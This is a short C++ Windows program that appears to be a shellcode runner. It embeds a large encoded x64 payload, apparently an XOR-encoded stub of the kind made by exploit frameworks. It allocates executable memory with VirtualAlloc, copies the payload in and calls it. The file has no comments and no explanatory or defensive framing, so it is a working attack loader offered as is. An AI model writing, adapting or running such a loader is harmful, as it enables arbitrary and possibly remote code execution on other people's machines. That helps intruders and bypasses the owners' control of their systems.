#include "stdafx.h"
#include "Windows.h"

int main()
{
	unsigned char shellcode[] =
		"\x48\x31\xc9\x48\x81\xe9\xc6\xff\xff\xff\x48\x8d\x05\xef\xff"
		"\xff\xff\x48\xbb\xdf\x14\x91\x06\x8c\x0b\xeb\xb0\x48\x31\x58"
		"\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\x23\x5c\x12\xe2\x7c\xe3"
		"\x2b\xb0\xdf\x14\xd0\x57\xcd\x5b\xb9\xe1\x89\x5c\xa0\xd4\xe9"
		"\x43\x60\xe2\xbf\x5c\x1a\x54\x94\x43\x60\xe2\xff\x5c\x1a\x74"
		"\xdc\x43\xe4\x07\x95\x5e\xdc\x37\x45\x43\xda\x70\x73\x28\xf0"
		"\x7a\x8e\x27\xcb\xf1\x1e\xdd\x9c\x47\x8d\xca\x09\x5d\x8d\x55"
		"\xc0\x4e\x07\x59\xcb\x3b\x9d\x28\xd9\x07\x5c\x80\x6b\x38\xdf"
		"\x14\x91\x4e\x09\xcb\x9f\xd7\x97\x15\x41\x56\x07\x43\xf3\xf4"
		"\x54\x54\xb1\x4f\x8d\xdb\x08\xe6\x97\xeb\x58\x47\x07\x3f\x63"
		"\xf8\xde\xc2\xdc\x37\x45\x43\xda\x70\x73\x55\x50\xcf\x81\x4a"
		"\xea\x71\xe7\xf4\xe4\xf7\xc0\x08\xa7\x94\xd7\x51\xa8\xd7\xf9"
		"\xd3\xb3\xf4\x54\x54\xb5\x4f\x8d\xdb\x8d\xf1\x54\x18\xd9\x42"
		"\x07\x4b\xf7\xf9\xde\xc4\xd0\x8d\x88\x83\xa3\xb1\x0f\x55\xc9"
		"\x47\xd4\x55\xb2\xea\x9e\x4c\xd0\x5f\xcd\x51\xa3\x33\x33\x34"
		"\xd0\x54\x73\xeb\xb3\xf1\x86\x4e\xd9\x8d\x9e\xe2\xbc\x4f\x20"
		"\xeb\xcc\x4f\x32\x7c\x98\x82\x80\x27\xa3\x06\x8c\x4a\xbd\xf9"
		"\x56\xf2\xd9\x87\x60\xab\xea\xb0\xdf\x5d\x18\xe3\xc5\xb7\xe9"
		"\xb0\xde\xaf\x51\xae\x8d\x25\xaa\xe4\x96\x9d\x75\x4a\x05\xfa"
		"\xaa\x0a\x93\x63\xb7\x01\x73\xde\xa7\x39\x35\x7c\x90\x07\x8c"
		"\x0b\xb2\xf1\x65\x3d\x11\x6d\x8c\xf4\x3e\xe0\x8f\x59\xa0\xcf"
		"\xc1\x3a\x2b\xf8\x20\xd4\xd9\x8f\x4e\x43\x14\x70\x97\x9d\x50"
		"\x47\x36\xe1\xe4\x6f\x3f\xeb\x44\x4e\x05\xcc\x81\xa0\x9e\x4c"
		"\xdd\x8f\x6e\x43\x62\x49\x9e\xae\x08\xa3\xf8\x6a\x14\x65\x97"
		"\x95\x55\x46\x8e\x0b\xeb\xf9\x67\x77\xfc\x62\x8c\x0b\xeb\xb0"
		"\xdf\x55\xc1\x47\xdc\x43\x62\x52\x88\x43\xc6\x4b\xbd\xcb\x81"
		"\xbd\x86\x55\xc1\xe4\x70\x6d\x2c\xf4\xfb\x40\x90\x07\xc4\x86"
		"\xaf\x94\xc7\xd2\x91\x6e\xc4\x82\x0d\xe6\x8f\x55\xc1\x47\xdc"
		"\x4a\xbb\xf9\x20\xd4\xd0\x56\xc5\xf4\x23\xfd\x56\xd5\xdd\x8f"
		"\x4d\x4a\x51\xc9\x13\x2b\x17\xf9\x59\x43\xda\x62\x97\xeb\x5b"
		"\x8d\x82\x4a\x51\xb8\x58\x09\xf1\xf9\x59\xb0\x1b\x05\x7d\x42"
		"\xd0\xbc\x2a\x9e\x56\x2d\x20\xc1\xd9\x85\x48\x23\xd7\xb6\xa3"
		"\x1e\x11\xfd\x6c\x7e\xee\x0b\x98\x07\xe3\x69\xe6\x0b\xb2\xf1"
		"\x56\xce\x6e\xd3\x8c\x0b\xeb\xb0";

	void *exec = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	memcpy(exec, shellcode, sizeof shellcode);
	((void(*)())exec)();

    return 0;
}